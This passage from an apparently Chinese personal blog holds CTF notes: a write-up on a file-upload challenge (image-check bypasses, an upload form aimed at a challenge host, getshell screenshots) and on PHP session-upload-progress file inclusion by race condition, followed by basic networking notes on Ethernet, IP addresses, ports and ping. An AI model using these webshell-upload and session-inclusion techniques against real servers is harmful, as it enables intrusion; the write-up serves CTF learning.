class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-string">&#x27;U&#x27;</span>);<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;ç&#x27;</span>, <span class="hljs-string">&#x27;Ç&#x27;</span>, <span class="hljs-string">&#x27;ğ&#x27;</span>, <span class="hljs-string">&#x27;Ğ&#x27;</span>, <span class="hljs-string">&#x27;ı&#x27;</span>, <span class="hljs-string">&#x27;İ&#x27;</span>, <span class="hljs-string">&#x27;ö&#x27;</span>, <span class="hljs-string">&#x27;Ö&#x27;</span>, <span class="hljs-string">&#x27;ş&#x27;</span>, <span class="hljs-string">&#x27;Ş&#x27;</span>, <span class="hljs-string">&#x27;ü&#x27;</span>, <span class="hljs-string">&#x27;Ü&#x27;</span>); İ的url编码：%c4%b0</code></pre><h4 id="2-绕getimagesize："><a href="#2-绕getimagesize：" class="headerlink" title="2. 绕getimagesize："></a>2. 绕getimagesize：</h4><pre><code class="hljs php"><span class="hljs-comment">#define test_width 1</span><span class="hljs-comment">#define test_height 1</span></code></pre><p>  <strong>注意⚠️放在文件末尾！</strong>    </p><ol start="3"><li>绕imagecreatefrompng</li></ol><p>文件上传脚本</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://42ae6f34-c405-4aa4-a2c1-c20b68500d8a.node3.buuoj.cn/?ctf=upload&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;postedFile&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;id&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143919.png" alt="image-20210530210553526"></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143920.png" alt="image-20210530210538872"></p><h4 id="3：解压出php"><a href="#3：解压出php" class="headerlink" title="3：解压出php"></a>3：解压出php</h4><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143921.png" alt="image-20210530211204373"></p><p>发现解压后一句话弄不了，发现是图片马二次渲染问题=》普通的图片马解决不了</p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143922.png" alt="image-20210531003611751" style="zoom:50%;"><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143923.png" alt="image-20210531003634582" style="zoom: 67%;"><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143924.png" alt="image-20210531003734744" style="zoom:50%;"><p>成功getshell</p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143925.png" alt="image-20210531003914233" style="zoom:50%;"><h4 id="发现更多"><a href="#发现更多" class="headerlink" title="发现更多"></a>发现更多</h4><p><a href="https://www.leavesongs.com/PENETRATION/when-imagemagick-meet-getimagesize.html#">imagemagick邂逅getimagesize的那点事儿</a></p><p><a href="https://xz.aliyun.com/t/2657#toc-3">upload-labs之pass 16详细分析</a></p><p><a href="https://www.jianshu.com/p/05a410f3f3e0">【靶场】文件上传upload-labs 21关【无WAF】</a></p><p><a href="http://www.phpheidong.com/blog/article/36019/7fc4518d58a4c40fcb31/">Upload-labs 1-21关 靶场通关攻略(全网最全最完整)</a>   、 <a href="http://myhackerworld.top/2019/01/19/upload-labs-%E5%AD%A6%E4%B9%A0/">2</a></p><p><a href="https://lemonprefect.cn/zh-cn/posts/7c083fa1#upload">wp</a> </p><p><a href="http://wh1sper.com/ciscn-2021-quals-writeup/">wp2**</a></p><h2 id="middle-source"><a href="#middle-source" class="headerlink" title="middle_source"></a>middle_source</h2><p><a href="https://blog.csdn.net/Anton__1/article/details/116891706?utm_medium=distribute.wap_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-2.wap_blog_relevant_pic&depth_1-utm_source=distribute.wap_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-2.wap_blog_relevant_pic">csdn wp1</a><br><a href="https://blog.csdn.net/m0_51078229/article/details/116845451">csdn wp2</a></p><p>考点：任意文件包含、PHP_SESSION_UPLOAD_PROGRESS➕条件竞争进行文件包含</p><p>利用对 文件上传时PHP_SESSION_UPLOAD_PROGRESS自动生成的临时session文件【代码注入】 条件竞争实现session里代码的执行</p><p>【<a href="https://xz.aliyun.com/t/9545#toc-8">【5**】先知社区浅谈 SESSION_UPLOAD_PROGRESS 的利用+session</a>】</p><h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p><a href="https://blog.csdn.net/qq_36992198/article/details/80007405?utm_source=app&app_version=4.7.1">csdn+ctf小例子</a></p><ol><li>Web服务器处理多用户请求时，是并发进行的，如果并发处理不当或者是相关的逻辑操作设计的不合理时，就可能导致条件竞争漏洞。</li></ol><ul><li>一个简单的例子：<br>将文件上传到服务器，然后检查上传的文件的类型，如果不符合条件就删除。</li></ul><ol start="2"><li>但是，如果我们采用<strong>多线程的方式访问上传的文件，总有一次我们在文件删除之前就访问到了这个文件</strong>，如果这个文件是php的一句话木马，就在服务器中执行，即getshell</li><li>注意⚠️上传的文件被杀软查杀了，是<strong>上传成功才被查杀的</strong>=》考虑利用条件竞争漏洞</li></ol><h4 id="ctf-python脚本不断访问："><a href="#ctf-python脚本不断访问：" class="headerlink" title="ctf python脚本不断访问："></a>ctf python脚本不断访问：</h4><pre><code class="hljs processing"><span class="hljs-keyword">import</span> requestsurl = <span class="hljs-string">&#x27;你的文件路径&#x27;</span><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:    r = requests.<span class="hljs-built_in">get</span>(url)    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> in  r.<span class="hljs-built_in">text</span>:        <span class="hljs-built_in">print</span> r.<span class="hljs-built_in">text</span></code></pre><h3 id="session-upload-progress"><a href="#session-upload-progress" class="headerlink" title="session.upload_progress"></a>session.upload_progress</h3><p><a href="https://www.cnblogs.com/NPFS/p/13795170.html">【**3】利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含</a></p><p><a href="https://cloud.tencent.com/developer/article/1650655">通过条件竞争进行文件上传</a></p><ul><li>前提是我们需要生成一个session文件，并且知道session文件的存放位置</li><li>只要在上传文件的时候，同时POST一个恶意的字段 PHP_SESSION_UPLOAD_PROGRESS，目标服务器的PHP就会自动启用Session，Session文件将会自动创建。</li></ul><ol><li> <strong>利用session.upload_progress后的value【可控】（木马）自动被写入session文件的特性</strong>，然后我们去包含这个session文件。</li><li><strong>session.use_strict_mode默认值为off，此时用户是可以自己定义Session ID的</strong>。比如，我们在Cookie里设置PHPSESSID=flag，PHP将会在服务器上创建一个文件：/tmp/sess_flag”。即使此时用户没有初始化Session，PHP也会自动初始化Session,并产生一个键值<ul><li>注：在Linux系统中，session文件一般的默认存储位置为 /tmp 或 /var/lib/php/session</li></ul></li><li>但是<strong>session.upload_progress.cleanup默认是开启的</strong><ul><li>意思是一旦读取了所有POST数据，它就会清除进度信息【文件上传结束后session会消失】</li><li>可以通过条件竞争来保持session从而实现文件上传</li></ul></li></ol><h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>其原理大致就是通过 PHP_SESSION_UPLOAD_PROGRESS 在目标主机上创建一个含有恶意代码【恶意代码在 PHP_SESSION_UPLOAD_PROGRESS的<strong>value里</strong>】的Session文件，之后利用文件包含漏洞去包含这个我们已经传入恶意代码的这个Session文件就可以达到攻击效果。</p><ol><li>上传文件时抓包➕方便认的cookie【这样服务器会生成对应名称的session文件】➕在PHP_SESSION_UPLOAD_PROGRESS下value后<strong>添加一句话木马</strong></li><li>然后发送到Intruder请求载荷 Null payloads 不断发包，维持session，传入恶意会话。</li><li>对上述的session文件也不断访问发包</li><li>这样，一边不断发包以维持恶意session存储，另一边不断发包请求包含恶意的session。<strong>一个POST一个GET</strong>，发现包含利用1上传的文件成功【或者加的一句话/任意命令成功执行】</li></ol>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF,比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF学习小记</title>
    <link href="/2020/12/03/CTF%E5%B0%8F%E8%AE%B0/"/>
    <url>/2020/12/03/CTF%E5%B0%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p> 持续更新，业余思考，仅供参考，有时间再改格式</p><h2 id="以太网"><a href="#以太网" class="headerlink" title="以太网"></a>以太网</h2><ul><li><p>按照传输技术来分类</p><p><strong>以太网Ethernet 、ATM网、FDDI网可以算作一类</strong></p></li><li><p>按照区域和范围来分类</p><p><strong>互联网 Internet 、广域网 WAN、局域网LAN可以算作一类</strong>，<strong>属于OSI参考类型的数据链路层</strong></p></li><li><p><strong>互联网是范围概念；以太网是技术概念</strong></p></li><li><p><img src="/.io//Users\12456\AppData\Roaming\Typora\typora-user-images\image-20201202201154687.png" alt="image-20201202201154687"></p></li></ul><p>1、简单来说，网络按照区域来划分，分为广域网和局域网。这只是按照使用区域大小来划分的。就像省和村的关系。<br>2、然后在这个小区域（局域网）里建设网络，就需要使用多种标准技术，其中电气标准中规定用双绞线还是单芯线等，这个电气标准中有以太网技术、令牌环网技术、ATM网技术、帧中继技术等，不要被以太网中这个网字迷惑，把它看成技术，我们是用了CSMA/CA技术（别名：以太网技术），使用方便、网络建造简洁，以太网技术就是流传开来。<br>3、局域网中物理网络按照以太网技术敷设完毕，还并不能通信，这个时候就需要其他技术标准，我们经常见到的TCP/IP技术，tcp/ip技术可以依托以太网技术、令牌环网技术等上使用，而且我们经常TCP/IP与以太网配合使用，所以我们日常中口语中容易将TCP/IP与以太网技术混在一起说。其实是不同层级的技术。</p><h2 id="因特网、互联网、以太网、局域网、万维网的区别"><a href="#因特网、互联网、以太网、局域网、万维网的区别" class="headerlink" title="因特网、互联网、以太网、局域网、万维网的区别"></a>因特网、互联网、以太网、局域网、万维网的区别</h2><ul><li><p>以太网可以说是局域网的一种，但是目前局域网大多数都是使用以太网标准，故可认为以太网就是局域网。然后，局域网之间的通信协议必须是相同的，即局域网内计算机（或计算机网络）只允许使用同一种通信规则进行通信。而不同的局域网之间，又可以通过其他任意的通信规则进行通信（内部只是用一种通信规则），这就构成了互联网。</p></li><li><p><strong>所以：以太网 &lt;= 局域网 &lt;= 互联网 != 因特网</strong></p><table><thead><tr><th>网络</th><th align="center">作用</th></tr></thead><tbody><tr><td>局域网：（Local Area Network，LAN）</td><td align="center">局域网是一个局部范围的计算计组，比如家庭网络就是一个小型的局域网，里面包含电脑、手机和平板等，他们共同连接到你家的路由器上。又比如学校的机房就是一个局域网，里面有几百几千台电脑，当机房无法上外网时，但是电脑之间仍可以通信，你们可以通过这个局域网来打CS 、玩红警。理论上，局域网是封闭的，并不可以上外网，可以只有两台电脑，也可以有上万台。</td></tr><tr><td>广域网：（WAN，Wide Area Network）</td><td align="center">广域网的范围就比较大了，可以把你家和别人家、各个省、各个国家连接起来相互通信。广域网和局域网都是从范围的角度来划分的，广域网也可以看成是很多个局域网通过路由器等相互连接起来。</td></tr><tr><td>以太网：(Ethernet)</td><td align="center">以太网可以看成是一种实现局域网通信的<strong>技术标准</strong>，是目前最广泛的<strong>局域网技术</strong>。以太网的运行速率有10Mbps,100Mbps,1Gbps,10Gbps的，它的传输介质有的是双绞线，有的是光纤。 简单的说，以太网就是在局域网内，把附近的设备连接起来，可以进行通讯。以太网与<a href="http://baike.baidu.com/view/285040.htm">IEEE802.3</a>系列标准相类似。</td></tr><tr><td>互联网：（internet）</td><td align="center">它的意思是“网络的网络”，是一个通用名词，泛指有多个计算机网络互连而成的网络，这些网络之间的通信协议（即通信规则）是可以任意的，互联网可以看成是局域网、广域网等组成的一个最大的网络，它可以把世界上各个地方的网路都连接起来，个人、政府、学校、企业，只要你能想到的，都包含在内。互联网是一种宽泛的概念，是一个极其庞大的网络。</td></tr><tr><td>因特网，（Internet）</td><td align="center">记住它与 internet 之间绝对不能使用等于号，因为 Internet 是一个专有名词，它是指当前全球最大的、开放的、有众多网络互相连接而成的特定的计算机网络，它采用 TCP/IP 协议族作为通信的规则，其前身是美国的 ARPNET</td></tr><tr><td>万维网（WWW）</td><td align="center"><strong>它不是一种网络</strong>，它是构建在互联网之上的一个系统/技术，这个系统由很多相互链接的超文本组成</td></tr></tbody></table></li></ul><h3 id="什么是网络？"><a href="#什么是网络？" class="headerlink" title="什么是网络？"></a>什么是网络？</h3><p>名词解释：计算机网络（network），就是将一台以上的计算机互连起来，互连的计算机之间可以实现通信，实现信息共享，这就是网络。</p><ul><li>互联网（internet），指的是网络的网络，英文小写字母开头，中文采用意译；它可以将多个隔离的网络连接起来，例如公司办公网就是一种互联网，它连接了多个办公楼的网络；</li><li>因特网（Internet）是专有名词，所以英文大写开头，中文采用音译；它是目前最大的互联网，它把全球的网络连接了起来；</li><li>局域网（Local Area Network，LAN）、广域网（Wide Area Network，WAN）和城域网（Metropolitan Area Network，MAN），这几个网络的区别是它们范围不同，中文采用意译；</li><li>以太网（Ethernet）是专有名词，所以英文大写开头，中文采用音译；以太网是局域网的一种，它还有另一个名字：IEEE 802.3，它非常厉害打败了历史上的其它局域网技术，是今天的主流；<strong>今天只要你插上网线那一定就是连入了以太网；如果你用手机连了WiFi，WiFi也是一种局域网，WiFi的另一个名字是：IEEE 802.11；可以说今天的局域网技术几乎被以太网和WiFi垄断了；</strong></li></ul><p>下面这些是网络：</p><ul><li>互联网、因特网、局域网、广域网、城域网</li></ul><p><strong>下面这些不是网络：</strong></p><ul><li>万维网（WWW），它不是一种网络，它是构建在互联网之上的一个系统，这个系统由很多相互链接的超文本组成</li><li><code>以太网和WiFi，它们是一种局域网技术</code></li></ul><h3 id="网络的分类"><a href="#网络的分类" class="headerlink" title="网络的分类"></a>网络的分类</h3><p>将网络按照传输介质划分：</p><ul><li>有线网络</li><li>无线网络</li></ul><p>将网络按照覆盖范围划分：</p><ul><li>个域网（PAN:Personal Area Network）覆盖范围大约1米，你的电脑、鼠标、键盘、显示器就组成了一个PAN</li><li>局域网（LAN:Local Area Network）比PAN大</li><li>城域网（MAN:Metropolitan Area Network）比LAN大</li><li>广域网（WAN:Wide Area Network）比MAN大</li></ul><h3 id="网络之间的关系"><a href="#网络之间的关系" class="headerlink" title="网络之间的关系"></a>网络之间的关系</h3><p>这些名词之间的关系：</p><ul><li>因特网是一种具体的互联网</li><li>以太网是一种具体的局域网技术</li><li>WiFi是一种具体的局域网技术</li></ul><h2 id="WIFI和WLAN的区别是什么"><a href="#WIFI和WLAN的区别是什么" class="headerlink" title="WIFI和WLAN的区别是什么"></a>WIFI和WLAN的区别是什么</h2><blockquote><p><a href="https://product.pconline.com.cn/itbk/wlbg/wireless/1305/3303939.html">https://product.pconline.com.cn/itbk/wlbg/wireless/1305/3303939.html</a></p><p><a href="https://tw.aboluowang.com/2019/1013/1354979.html">https://tw.aboluowang.com/2019/1013/1354979.html</a></p></blockquote><table><thead><tr><th>WLAN(Wireless Local Area Networks)</th><th>中文解释为：无线区域网络，它是一种数据传输<em>系统</em>。WLAN是利用射频技术进行数据传输，以此来实现通信和共享资源的网络体系</th></tr></thead><tbody><tr><td></td><td><strong>无线局域网的通信范围不受环境的限制，网络的传输范围也很广，最大可达到几十公里。在无线信号覆盖到的任何地方，用户将计算机任意移动，都能连接到网络。对于暂时性的工作小组或家庭组建网络而言，无线局域网是最合适不过的</strong></td></tr><tr><td>Wi-Fi</td><td>Wi-Fi是由无线访问节点（access point，AP）和无线网卡组成的无线网络。无线访问节点是传统有线局域网络与无线局域网络之间的桥梁，工作原理与一个内置无线发射器的hub（一个多端口的转发器）或者路由等同；无线网卡则是用来接收由无线访问节点发射的信号的设备</td></tr><tr><td></td><td>WiFi全称为Wireless Fidelity，中文意思是「无线保真」，是一个创建于IEE8.2.11标准的<strong>无线区域网技术</strong>，这种技术改善了基于IEE802.11标准的无线网络产品之间的互通性。在无线区域网的范畴是指「无线相容性认证」，是目前非常流行的一种无线网络技术</td></tr><tr><td></td><td><strong>WiFI技术与蓝牙技术相似，属于短距离的无线技术</strong></td></tr></tbody></table><ul><li><p>那WLAN与Wi-Fi有什么区别呢？</p><p>虽然很多人会将Wi-Fi与WLAN混为一谈，但实际上Wi-Fi只是WLAN技术的一部分。WLAN包含两个技术协议标准：IEEE802.11标准与HiperLAN标准，而IEEE802.11系列标准由Wi-Fi联盟负责推广，使用IEEE802.11系列协议的局域网就被称为Wi-Fi。但Wi-Fi在无线局域网的范畴是指“无线相容性认证”，实质上是一种商业认证，后来，慢慢被人们用来代指无线联网技术。所以，从包含关系上来说，Wi-Fi包含于WLAN中。</p></li></ul><ul><li><p>简而言之，Wi-Fi技术与蓝牙技术相同，是短距离无线技术。通俗来说，Wi-Fi也是一种无线联网技术，由网线转变为无线电波来连接网络。常见方式是，在一个无线路由器的电波有效覆盖范围内，都可以采用Wi-Fi连接方式进行联网。</p><p>因此，Wi-Fi最大的优势与WLAN相同，在于不用布线，不受布线条件的限制，所以适用于移动办公用户</p></li></ul><p>  <code>简单来说，Wlan是无线区域网的总称，Wifi是WLAN中应用最广的一种认证，两者的区别就是WLAN包含了WiFi，而且使用的范围更广。</code></p><h2 id="彻底明白ip地址，区分localhost、127-0-0-1和0-0-0-0"><a href="#彻底明白ip地址，区分localhost、127-0-0-1和0-0-0-0" class="headerlink" title="彻底明白ip地址，区分localhost、127.0.0.1和0.0.0.0"></a>彻底明白ip地址，区分localhost、127.0.0.1和0.0.0.0</h2><p><a href="https://www.jianshu.com/p/ad7cd1d5be45">https://www.jianshu.com/p/ad7cd1d5be45</a></p><h3 id="localhost"><a href="#localhost" class="headerlink" title="localhost"></a>localhost</h3><p><strong>localhost</strong>其实是<code>域名</code>，一般windows系统默认将<strong>localhost</strong>指向<code>127.0.0.1</code>，但是<strong>localhost</strong>并不等于<code>127.0.0.1</code>，<strong>localhost</strong>指向的<strong>IP地址</strong>是可以配置的</p><h3 id="127-0-0-1"><a href="#127-0-0-1" class="headerlink" title="127.0.0.1"></a>127.0.0.1</h3><p>首先我们要先知道一个概念，凡是以<code>127</code>开头的<strong>IP地址</strong>，都是<strong>回环地址（Loop back address）</strong>，其所在的回环接口一般被理解为虚拟网卡，并不是真正的路由器接口。</p><p>所谓的回环地址，通俗的讲，就是我们在主机上发送给<code>127</code>开头的<strong>IP地址</strong>的数据包会被发送的主机自己接收，根本传不出去，外部设备也无法通过回环地址访问到本机。</p><blockquote><p><strong>小说明</strong>：正常的<code>数据包</code>会从<code>IP层</code>进入<code>链路层</code>，然后发送到<code>网络</code>上；而给<code>回环地址</code>发送<code>数据包</code>，<code>数据包</code>会直接被发送主机的<code>IP层</code>获取，后面就没有<code>链路层</code>他们啥事了。</p></blockquote><p>而<code>127.0.0.1</code>作为<code>&#123;127&#125;</code>集合中的一员，当然也是个回环地址。只不过<code>127.0.0.1</code>经常被默认配置为<strong>localhost</strong>的<strong>IP地址</strong>。<br> 一般会通过<code>ping 127.0.0.1</code>来测试某台机器上的网络设备是否工作正常。</p><h3 id="0-0-0-0"><a href="#0-0-0-0" class="headerlink" title="0.0.0.0"></a>0.0.0.0</h3><p>首先，<code>0.0.0.0</code>是不能被<code>ping</code>通的。在服务器中，<code>0.0.0.0</code>并不是一个真实的的<strong>IP地址</strong>，它表示本机中所有的<strong>IPV4地址</strong>。监听<code>0.0.0.0</code>的端口，就是监听本机中所有<strong>IP</strong>的端口。</p><h3 id="本机IP"><a href="#本机IP" class="headerlink" title="本机IP"></a>本机IP</h3><p><strong>本机IP</strong>通常仅指在同一个局域网内，能同时被外部设备访问和本机访问的那些<strong>IP地址</strong>（可能不止一个）。像<code>127.0.0.1</code>这种一般是不被当作<strong>本机IP</strong>的。<strong>本机IP</strong>是与具体的网络接口绑定的，比如以太网卡、无线网卡或者PPP/PPPoE拨号网络的虚拟网卡，想要正常工作都要绑定一个地址，否则其他设备就不知道如何访问它。</p><h3 id="小例子剧场（帮助理解本机IP、127-0-0-1和0-0-0-0）"><a href="#小例子剧场（帮助理解本机IP、127-0-0-1和0-0-0-0）" class="headerlink" title="小例子剧场（帮助理解本机IP、127.0.0.1和0.0.0.0）"></a>小例子剧场（帮助理解本机IP、127.0.0.1和0.0.0.0）</h3><p>现在有两台pc在同一个局域网内，分别为pc1与pc2，pc1上有一个网卡，IP地址为<code>192.168.10.128</code></p><ul><li>pc1中sever监听<code>127.0.0.1</code>，则pc1中的client可以连上<code>127.0.0.1</code>，<code>192.168.10.128</code>连不上；而pc2中client都连不上。</li><li>pc1中sever监听<code>192.168.10.128</code>，则pc1中的client可以连上<code>192.168.10.128</code>，<code>127.0.0.1</code>连不上；而pc2中client能连上<code>192.168.10.128</code>。</li><li>pc1中sever监听<code>0.0.0.0</code>，则pc1中的client可以连上<code>127.0.0.1</code>和<code>192.168.10.128</code>，pc2中的client能连上<code>192.168.10.128</code>。</li></ul><p>Q:</p><p>server监听是啥意思？</p><p>client啥意思？</p><p>网卡，虚拟网卡，</p><p>局域网</p><h2 id="server监听是啥意思？-’端口‘解释"><a href="#server监听是啥意思？-’端口‘解释" class="headerlink" title="server监听是啥意思？+’端口‘解释"></a>server监听是啥意思？+’端口‘解释</h2><ul><li>首先了解一下TCP/IP协议中的端口指的是什么呢？如果把IP地址比作一间房子 ，端口就是出入这间房子的门。真正的房子只有几个门，但是一个IP地址的端口 可以有65536（即：256×256）个之多！端口是通过端口号来标记的，端口号只有整数，范围是从0 到65535（256×256-1）。<br>  在Internet上，各主机间通过TCP/IP协议发送和接收数据包，各个数据包根据其目的主机的ip地址来进行互联网络中的路由选择。可见，把数据包顺利的传送到目的主机是没有问题的。问题出在哪里呢?我们知道大多数操作系统都支持多程序（进程）同时运行，那么<strong>目的主机应该把接收到的数据包传送给众多同时运行的进程中的哪一个呢</strong>？<strong>显然这个问题有待解决，端口机制便由此被引入进来</strong>。<br>  本地操作系统会给那些有需求的进程分配协议端口（protocol port，即我们常说的端口），每个协议端口由一个正整数标识，如：80，139，445，等等。当目的主机接收到数据包后，将根据报文首部的目的端口号，把数据发送到相应端口，而与此端口相对应的那个进程将会领取数据并等待下一组数据的到来。说到这里，端口的概念似乎仍然抽象，那么继续跟我来，别走开。<br>  端口其实就是队，操作系统为各个进程分配了不同的队，数据包按照目的端口被推入相应的队中，等待被进程取用，在极特殊的情况下，这个队也是有可能溢出的，不过操作系统允许各进程指定和调整自己的队的大小。<br>  不光接受数据包的进程需要开启它自己的端口，发送数据包的进程也需要开启端口，这样，数据包中将会标识有源端口，以便接受方能顺利的回传数据包到这个端口。</li></ul><pre><code class="hljs armasm">一个数据包包括了文件，<span class="hljs-built_in">ip</span>，和端口号，<span class="hljs-built_in">ip</span>是为了服务器可以找到你的主机，端口号是你接受数据包的门户， 而所谓的端口监听，是指主机网络进程接受到<span class="hljs-built_in">IP</span>数据包后，察看其的目标端口是不是自己的端口号，如果是的话就接受该数据包进行处理。进行网络通讯的主机，既要发送数据，也要接受数据，所以就要开启相应的端口以接受数据。一个网络上的主机有可能开启多个网络进程（如即浏览网页又上QQ），也就是监听了多个端口。</code></pre><h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><p><a href="https://www.jianshu.com/p/d45540c86d2c">ping是什么</a></p><p><a href="https://blog.csdn.net/hebbely/article/details/54965989">https://blog.csdn.net/hebbely/article/details/54965989</a></p><ul><li>简单来说，「ping」是用来探测本机与网络中另一主机之间是否可达的命令，如果两台主机之间ping不通，则表明这两台主机不能建立起连接。ping是定位<strong>网络通不通</strong>的一个重要手段。</li><li><strong>ping可以检查网络是否连通，可以很好地帮助我们分析和判定网络故障</strong></li><li><strong>它所利用的原理是这样的：利用网络上机器IP地址的唯一性，给目标IP地址发送一个数据包，再要求对方返回一个同样大小的数据包来确定两台网络机器是否连接相通，时延是多少。</strong></li><li><strong>总结来说ping就是从某个数据包发送到服务器开始，到收到服务器反馈为止的时间就是ping，一般以毫秒计算。游戏中常常会用到ping的速度问题，比如：lol中ctrl+f就会出现ping值，一般ping值越高，说明服务器反馈时间长，游戏就会越卡。</strong></li><li><strong>ping是TCP/IP通信协议的一部分</strong></li></ul><pre><code class="hljs routeros">使用Ping检查连通性有五个步骤：*1. 使用ipconfig /all观察本地网络设置是否正确；2.<span class="hljs-built_in"> Ping </span>127.0.0.1  检查本地的TCP/IP协议有没有设置好；!!3. Ping本机IP地址，这样是为了检查本机的IP地址是否设置有误；!!4. Ping本网网关或本网IP地址，这样的是为了检查硬件设备是否有问题，也可以检查本机与本地网络连接是否正常；（在非局域网中这一步骤可以忽略）5. Ping远程IP地址，这主要是检查本网或本机与外部的连接是否正常。</code></pre><pre><code class="hljs angelscript">Pinging <span class="hljs-number">202.105</span><span class="hljs-number">.136</span><span class="hljs-number">.105</span> with <span class="hljs-number">32</span> bytes of data:Reply <span class="hljs-keyword">from</span> <span class="hljs-number">202.105</span><span class="hljs-number">.136</span><span class="hljs-number">.105</span>: bytes=<span class="hljs-number">32</span> time=<span class="hljs-number">590</span>ms TTL=<span class="hljs-number">114</span>Reply <span class="hljs-keyword">from</span> <span class="hljs-number">202.105</span><span class="hljs-number">.136</span><span class="hljs-number">.105</span>: bytes=<span class="hljs-number">32</span> time=<span class="hljs-number">590</span>ms TTL=<span class="hljs-number">114</span>Reply <span class="hljs-keyword">from</span> <span class="hljs-number">202.105</span><span class="hljs-number">.136</span><span class="hljs-number">.105</span>: bytes=<span class="hljs-number">32</span> time=<span class="hljs-number">590</span>ms TTL=<span class="hljs-number">114</span>Reply <span class="hljs-keyword">from</span> <span class="hljs-number">202.105</span><span class="hljs-number">.136</span><span class="hljs-number">.105</span>: bytes=<span class="hljs-number">32</span> time=<span class="hljs-number">601</span>ms TTL=<span class="hljs-number">114</span>Ping statistics <span class="hljs-keyword">for</span> <span class="hljs-number">202.105</span><span class="hljs-number">.136</span><span class="hljs-number">.105</span>:Packets: Sent = <span class="hljs-number">4</span>, Received = <span class="hljs-number">4</span>, Lost = <span class="hljs-number">0</span> (<span class="hljs-number">0</span>% loss),Approximate round trip times <span class="hljs-keyword">in</span> milli-seconds:Minimum = <span class="hljs-number">590</span>ms, Maximum = <span class="hljs-number">601</span>ms, Average = <span class="hljs-number">593</span>ms</code></pre><ul><li><p>Ping这个命令除了可以检查网络的连通和检测故障以外，还有一个比较有趣的用途，那就是可以利用它的一些返回数据，来估算你跟某台主机之间的速度是多少字节每秒</p></li><li><p>bytes=32表示ICMP报文中有32个字节的测试数据（这是估算速度的关键数据）</p></li><li><p>“时间=6ms”是往返时间。 </p><p>“已发送=4”发送多个秒包、”已接收=4”收到多个回应包、”丢失=0”丢弃了多少个；</p><p>Minmum 最小值 、MAXimun 最大值、Average 平均值。</p><p>所在图上来看，来回只用了6MS 时间，lost =0 即是丢包数为0，网络状态相当良好；</p></li></ul><pre><code class="hljs stylus">ping -t www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>  <span class="hljs-comment">// Ping 指定的主机，直到停止。</span>例如命令：ping -t www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span> 那么机器会一直ping www<span class="hljs-selector-class">.baidu</span>.com直到我们按Ctrl+C键来停止。</code></pre><pre><code class="hljs stylus">ping -n www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span> <span class="hljs-comment">//定义向目标IP发送数据包的次数</span>例如命令：ping -n <span class="hljs-number">10</span> www<span class="hljs-selector-class">.baidu</span>.com，那么本地计算机就会ping www<span class="hljs-selector-class">.baidu</span>.com10次，如果不加-n 参数的话，系统默认是ping4次</code></pre><pre><code class="hljs markdown">ping -l www.baidu.com    //定义发送数据包的大小，默认为32字节，我们利用它可以最大定义到65500字节。例如命令：ping -l 100 [<span class="hljs-string">www.baidu.com</span>](<span class="hljs-link">https://link.jianshu.com?t=http://www.baidu.com</span>)，那么本地计算机就会用100字节的数据包去 ping [<span class="hljs-string">www.baidu.com</span>](<span 